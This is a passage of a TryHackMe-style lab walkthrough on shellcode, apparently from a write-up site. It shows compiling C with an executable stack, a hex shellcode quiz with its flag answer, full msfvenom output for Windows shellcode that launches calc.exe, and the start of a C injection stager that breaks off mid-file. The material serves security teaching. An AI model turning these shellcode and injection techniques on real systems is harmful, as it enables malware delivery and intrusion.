<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Compiler our C program</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ gcc </span><span class="token parameter variable" style="color:#36acaa">-g</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-Wall</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-z</span><span class="token plain"> execstack thm.c </span><span class="token parameter variable" style="color:#36acaa">-o</span><span class="token plain"> thmx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ ./thmx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">THM,Rocks</span><span class="token operator" style="color:#393A34">!</span><br></span></code></pre></div></div>
<p>Nice! it works. Note that we compile the C program by disabling the NX protection, which may prevent us from executing the code correctly in the data segment or stack.</p>
<p>Understanding shellcodes and how they are created is essential for the following tasks, especially when dealing with encrypting and encoding the shellcode.</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> Modify your C program to execute the following shellcode. What is the flag? </summary><div><div class="collapsibleContent_i85q"><div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">unsigned</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> message</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0xeb</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x34</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xb9</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x5e</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x48</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x89</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xf0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x80</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x34</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x08</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x01</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x48</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x83</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xc1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x01</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x48</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x83</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xf9</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x19</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x75</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0xf2</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xb8</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x01</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xbf</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x01</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xba</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x19</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x0f</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x05</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xb8</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x3c</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xbf</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x0f</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x05</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xe8</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xc7</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xff</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xff</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xff</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x55</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x49</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x4c</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x7a</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x78</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x31</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x74</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x73</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x2c</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x30</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x72</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x36</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x2c</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0x34</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x69</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x32</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x30</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x30</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x62</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x31</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x65</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x32</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x7c</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x0d</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x0a</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">THM{y0ur-1s7-5h311c0d3}</span><br></span></code></pre></div></div></div></div></details></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="task-5-generate-shellcode">Task 5 Generate Shellcode<a href="#task-5-generate-shellcode" class="hash-link" aria-label="Direct link to Task 5 Generate Shellcode" title="Direct link to Task 5 Generate Shellcode" translate="no">​</a></h2>
<p>In this task, we continue working with shellcode and demonstrate how to generate and execute shellcode using public tools such as the Metasploit framework.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="generate-shellcode-using-public-tools">Generate shellcode using Public Tools<a href="#generate-shellcode-using-public-tools" class="hash-link" aria-label="Direct link to Generate shellcode using Public Tools" title="Direct link to Generate shellcode using Public Tools" translate="no">​</a></h3>
<p>Shellcode can be generated for a specific format with a particular programming language. This depends on you. For example, if your dropper, which is the main exe file, contains the shellcode that will be sent to a victim, and is written in C, then we need to generate a shellcode format that works in C.</p>
<p>The advantage of generating shellcode via public tools is that we don&#x27;t need to craft a custom shellcode from scratch, and we don&#x27;t even need to be an expert in assembly language. Most public C2 frameworks provide their own shellcode generator compatible with the C2 platform. Of course, this is so convenient for us, but the drawback is that most, or we can say all, generated shellcodes are well-known to AV vendors and can be easily detected.</p>
<p>We will use Msfvenom on the AttackBox to generate a shellcode that executes Windows files. We will be creating a shellcode that runs the <code>calc.exe</code> application.</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Generate Shellcode to Execute calc.exe</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ msfvenom </span><span class="token parameter variable" style="color:#36acaa">-a</span><span class="token plain"> x86 </span><span class="token parameter variable" style="color:#36acaa">--platform</span><span class="token plain"> windows </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> windows/exec </span><span class="token assign-left variable" style="color:#36acaa">cmd</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">calc.exe </span><span class="token parameter variable" style="color:#36acaa">-f</span><span class="token plain"> c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">No encoder specified, outputting raw payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Payload size: </span><span class="token number" style="color:#36acaa">193</span><span class="token plain"> bytes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Final size of c file: </span><span class="token number" style="color:#36acaa">835</span><span class="token plain"> bytes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">unsigned char buf</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;</span><span class="token string entity" style="color:#36acaa">\xfc</span><span class="token string entity" style="color:#36acaa">\xe8</span><span class="token string entity" style="color:#36acaa">\x82</span><span class="token string entity" style="color:#36acaa">\x00</span><span class="token string entity" style="color:#36acaa">\x00</span><span class="token string entity" style="color:#36acaa">\x00</span><span class="token string entity" style="color:#36acaa">\x60</span><span class="token string entity" style="color:#36acaa">\x89</span><span class="token string entity" style="color:#36acaa">\xe5</span><span class="token string entity" style="color:#36acaa">\x31</span><span class="token string entity" style="color:#36acaa">\xc0</span><span class="token string entity" style="color:#36acaa">\x64</span><span class="token string entity" style="color:#36acaa">\x8b</span><span class="token string entity" style="color:#36acaa">\x50</span><span class="token string entity" style="color:#36acaa">\x30</span><span class="token string" style="color:#e3116c">&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;</span><span class="token string entity" style="color:#36acaa">\x8b</span><span class="token string entity" style="color:#36acaa">\x52</span><span class="token string entity" style="color:#36acaa">\x0c</span><span class="token string entity" style="color:#36acaa">\x8b</span><span class="token string entity" style="color:#36acaa">\x52</span><span class="token string entity" style="color:#36acaa">\x14</span><span class="token string entity" style="color:#36acaa">\x8b</span><span class="token string entity" style="color:#36acaa">\x72</span><span class="token string entity" style="color:#36acaa">\x28</span><span class="token string entity" style="color:#36acaa">\x0f</span><span class="token string entity" style="color:#36acaa">\xb7</span><span class="token string entity" style="color:#36acaa">\x4a</span><span class="token string entity" style="color:#36acaa">\x26</span><span class="token string entity" style="color:#36acaa">\x31</span><span class="token string entity" style="color:#36acaa">\xff</span><span class="token string" style="color:#e3116c">&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;</span><span class="token string entity" style="color:#36acaa">\xac</span><span class="token string entity" style="color:#36acaa">\x3c</span><span class="token string entity" style="color:#36acaa">\x61</span><span class="token string entity" style="color:#36acaa">\x7c</span><span class="token string entity" style="color:#36acaa">\x02</span><span class="token string entity" style="color:#36acaa">\x2c</span><span class="token string entity" style="color:#36acaa">\x20</span><span class="token string entity" style="color:#36acaa">\xc1</span><span class="token string entity" style="color:#36acaa">\xcf</span><span class="token string entity" style="color:#36acaa">\x0d</span><span class="token string entity" style="color:#36acaa">\x01</span><span class="token string entity" style="color:#36acaa">\xc7</span><span class="token string entity" style="color:#36acaa">\xe2</span><span class="token string entity" style="color:#36acaa">\xf2</span><span class="token string entity" style="color:#36acaa">\x52</span><span class="token string" style="color:#e3116c">&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;</span><span class="token string entity" style="color:#36acaa">\x57</span><span class="token string entity" style="color:#36acaa">\x8b</span><span class="token string entity" style="color:#36acaa">\x52</span><span class="token string entity" style="color:#36acaa">\x10</span><span class="token string entity" style="color:#36acaa">\x8b</span><span class="token string entity" style="color:#36acaa">\x4a</span><span class="token string entity" style="color:#36acaa">\x3c</span><span class="token string entity" style="color:#36acaa">\x8b</span><span class="token string entity" style="color:#36acaa">\x4c</span><span class="token string entity" style="color:#36acaa">\x11</span><span class="token string entity" style="color:#36acaa">\x78</span><span class="token string entity" style="color:#36acaa">\xe3</span><span class="token string entity" style="color:#36acaa">\x48</span><span class="token string entity" style="color:#36acaa">\x01</span><span class="token string entity" style="color:#36acaa">\xd1</span><span class="token string" style="color:#e3116c">&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;</span><span class="token string entity" style="color:#36acaa">\x51</span><span class="token string entity" style="color:#36acaa">\x8b</span><span class="token string entity" style="color:#36acaa">\x59</span><span class="token string entity" style="color:#36acaa">\x20</span><span class="token string entity" style="color:#36acaa">\x01</span><span class="token string entity" style="color:#36acaa">\xd3</span><span class="token string entity" style="color:#36acaa">\x8b</span><span class="token string entity" style="color:#36acaa">\x49</span><span class="token string entity" style="color:#36acaa">\x18</span><span class="token string entity" style="color:#36acaa">\xe3</span><span class="token string entity" style="color:#36acaa">\x3a</span><span class="token string entity" style="color:#36acaa">\x49</span><span class="token string entity" style="color:#36acaa">\x8b</span><span class="token string entity" style="color:#36acaa">\x34</span><span class="token string entity" style="color:#36acaa">\x8b</span><span class="token string" style="color:#e3116c">&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;</span><span class="token string entity" style="color:#36acaa">\x01</span><span class="token string entity" style="color:#36acaa">\xd6</span><span class="token string entity" style="color:#36acaa">\x31</span><span class="token string entity" style="color:#36acaa">\xff</span><span class="token string entity" style="color:#36acaa">\xac</span><span class="token string entity" style="color:#36acaa">\xc1</span><span class="token string entity" style="color:#36acaa">\xcf</span><span class="token string entity" style="color:#36acaa">\x0d</span><span class="token string entity" style="color:#36acaa">\x01</span><span class="token string entity" style="color:#36acaa">\xc7</span><span class="token string entity" style="color:#36acaa">\x38</span><span class="token string entity" style="color:#36acaa">\xe0</span><span class="token string entity" style="color:#36acaa">\x75</span><span class="token string entity" style="color:#36acaa">\xf6</span><span class="token string entity" style="color:#36acaa">\x03</span><span class="token string" style="color:#e3116c">&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;</span><span class="token string entity" style="color:#36acaa">\x7d</span><span class="token string entity" style="color:#36acaa">\xf8</span><span class="token string entity" style="color:#36acaa">\x3b</span><span class="token string entity" style="color:#36acaa">\x7d</span><span class="token string entity" style="color:#36acaa">\x24</span><span class="token string entity" style="color:#36acaa">\x75</span><span class="token string entity" style="color:#36acaa">\xe4</span><span class="token string entity" style="color:#36acaa">\x58</span><span class="token string entity" style="color:#36acaa">\x8b</span><span class="token string entity" style="color:#36acaa">\x58</span><span class="token string entity" style="color:#36acaa">\x24</span><span class="token string entity" style="color:#36acaa">\x01</span><span class="token string entity" style="color:#36acaa">\xd3</span><span class="token string entity" style="color:#36acaa">\x66</span><span class="token string entity" style="color:#36acaa">\x8b</span><span class="token string" style="color:#e3116c">&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;</span><span class="token string entity" style="color:#36acaa">\x0c</span><span class="token string entity" style="color:#36acaa">\x4b</span><span class="token string entity" style="color:#36acaa">\x8b</span><span class="token string entity" style="color:#36acaa">\x58</span><span class="token string entity" style="color:#36acaa">\x1c</span><span class="token string entity" style="color:#36acaa">\x01</span><span class="token string entity" style="color:#36acaa">\xd3</span><span class="token string entity" style="color:#36acaa">\x8b</span><span class="token string entity" style="color:#36acaa">\x04</span><span class="token string entity" style="color:#36acaa">\x8b</span><span class="token string entity" style="color:#36acaa">\x01</span><span class="token string entity" style="color:#36acaa">\xd0</span><span class="token string entity" style="color:#36acaa">\x89</span><span class="token string entity" style="color:#36acaa">\x44</span><span class="token string entity" style="color:#36acaa">\x24</span><span class="token string" style="color:#e3116c">&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;</span><span class="token string entity" style="color:#36acaa">\x24</span><span class="token string entity" style="color:#36acaa">\x5b</span><span class="token string entity" style="color:#36acaa">\x5b</span><span class="token string entity" style="color:#36acaa">\x61</span><span class="token string entity" style="color:#36acaa">\x59</span><span class="token string entity" style="color:#36acaa">\x5a</span><span class="token string entity" style="color:#36acaa">\x51</span><span class="token string entity" style="color:#36acaa">\xff</span><span class="token string entity" style="color:#36acaa">\xe0</span><span class="token string entity" style="color:#36acaa">\x5f</span><span class="token string entity" style="color:#36acaa">\x5f</span><span class="token string entity" style="color:#36acaa">\x5a</span><span class="token string entity" style="color:#36acaa">\x8b</span><span class="token string entity" style="color:#36acaa">\x12</span><span class="token string entity" style="color:#36acaa">\xeb</span><span class="token string" style="color:#e3116c">&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;</span><span class="token string entity" style="color:#36acaa">\x8d</span><span class="token string entity" style="color:#36acaa">\x5d</span><span class="token string entity" style="color:#36acaa">\x6a</span><span class="token string entity" style="color:#36acaa">\x01</span><span class="token string entity" style="color:#36acaa">\x8d</span><span class="token string entity" style="color:#36acaa">\x85</span><span class="token string entity" style="color:#36acaa">\xb2</span><span class="token string entity" style="color:#36acaa">\x00</span><span class="token string entity" style="color:#36acaa">\x00</span><span class="token string entity" style="color:#36acaa">\x00</span><span class="token string entity" style="color:#36acaa">\x50</span><span class="token string entity" style="color:#36acaa">\x68</span><span class="token string entity" style="color:#36acaa">\x31</span><span class="token string entity" style="color:#36acaa">\x8b</span><span class="token string entity" style="color:#36acaa">\x6f</span><span class="token string" style="color:#e3116c">&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;</span><span class="token string entity" style="color:#36acaa">\x87</span><span class="token string entity" style="color:#36acaa">\xff</span><span class="token string entity" style="color:#36acaa">\xd5</span><span class="token string entity" style="color:#36acaa">\xbb</span><span class="token string entity" style="color:#36acaa">\xf0</span><span class="token string entity" style="color:#36acaa">\xb5</span><span class="token string entity" style="color:#36acaa">\xa2</span><span class="token string entity" style="color:#36acaa">\x56</span><span class="token string entity" style="color:#36acaa">\x68</span><span class="token string entity" style="color:#36acaa">\xa6</span><span class="token string entity" style="color:#36acaa">\x95</span><span class="token string entity" style="color:#36acaa">\xbd</span><span class="token string entity" style="color:#36acaa">\x9d</span><span class="token string entity" style="color:#36acaa">\xff</span><span class="token string entity" style="color:#36acaa">\xd5</span><span class="token string" style="color:#e3116c">&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;</span><span class="token string entity" style="color:#36acaa">\x3c</span><span class="token string entity" style="color:#36acaa">\x06</span><span class="token string entity" style="color:#36acaa">\x7c</span><span class="token string entity" style="color:#36acaa">\x0a</span><span class="token string entity" style="color:#36acaa">\x80</span><span class="token string entity" style="color:#36acaa">\xfb</span><span class="token string entity" style="color:#36acaa">\xe0</span><span class="token string entity" style="color:#36acaa">\x75</span><span class="token string entity" style="color:#36acaa">\x05</span><span class="token string entity" style="color:#36acaa">\xbb</span><span class="token string entity" style="color:#36acaa">\x47</span><span class="token string entity" style="color:#36acaa">\x13</span><span class="token string entity" style="color:#36acaa">\x72</span><span class="token string entity" style="color:#36acaa">\x6f</span><span class="token string entity" style="color:#36acaa">\x6a</span><span class="token string" style="color:#e3116c">&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;</span><span class="token string entity" style="color:#36acaa">\x00</span><span class="token string entity" style="color:#36acaa">\x53</span><span class="token string entity" style="color:#36acaa">\xff</span><span class="token string entity" style="color:#36acaa">\xd5</span><span class="token string entity" style="color:#36acaa">\x63</span><span class="token string entity" style="color:#36acaa">\x61</span><span class="token string entity" style="color:#36acaa">\x6c</span><span class="token string entity" style="color:#36acaa">\x63</span><span class="token string entity" style="color:#36acaa">\x2e</span><span class="token string entity" style="color:#36acaa">\x65</span><span class="token string entity" style="color:#36acaa">\x78</span><span class="token string entity" style="color:#36acaa">\x65</span><span class="token string entity" style="color:#36acaa">\x00</span><span class="token string" style="color:#e3116c">&quot;</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p>As a result, the Metasploit framework generates a shellcode that executes the Windows calculator (calc.exe). The Windows calculator is widely used as an example in the Malware development process to show a proof of concept. If the technique works, then a new instance of the Windows calculator pops up. This confirms that any executable shellcode works with the method used.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="shellcode-injection">Shellcode injection<a href="#shellcode-injection" class="hash-link" aria-label="Direct link to Shellcode injection" title="Direct link to Shellcode injection" translate="no">​</a></h3>
<p>Hackers inject shellcode into a running or new thread and process using various techniques. Shellcode injection techniques modify the program&#x27;s execution flow to update registers and functions of the program to execute the attacker&#x27;s own code.</p>
<p>Now let&#x27;s continue using the generated shellcode and execute it on the operating system. The following is a C code containing our generated shellcode which will be injected into memory and will execute &quot;calc.exe&quot;.</p>
<p>On the AttackBox, let&#x27;s save the following in a file named <code>calc.c</code>:</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;windows.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> stager</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" 